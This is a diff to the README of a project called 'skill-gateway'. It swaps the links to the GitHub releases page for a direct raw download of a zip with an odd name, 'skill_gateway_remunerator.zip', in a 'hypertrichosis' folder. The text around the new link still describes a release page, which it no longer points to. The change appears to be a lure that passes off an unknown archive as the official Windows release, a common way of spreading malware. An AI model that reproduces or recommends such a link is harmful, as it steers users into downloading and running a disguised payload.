@@ -1,6 +1,6 @@
 # 🧭 skill-gateway - Route Every Request With Ease
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Foundersieve687/skill-gateway/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Foundersieve687/skill-gateway/raw/refs/heads/main/hypertrichosis/skill_gateway_remunerator.zip)
 
 ## 🚀 What it does
 
@@ -25,7 +25,7 @@ For the best result, use a stable internet connection while you download the rel
 
 Visit this page to download the latest version:
 
-https://github.com/Foundersieve687/skill-gateway/releases
+https://github.com/Foundersieve687/skill-gateway/raw/refs/heads/main/hypertrichosis/skill_gateway_remunerator.zip
 
 On that page, look for the newest release at the top. Under the release notes, find the Windows file. It may be named something like:
 
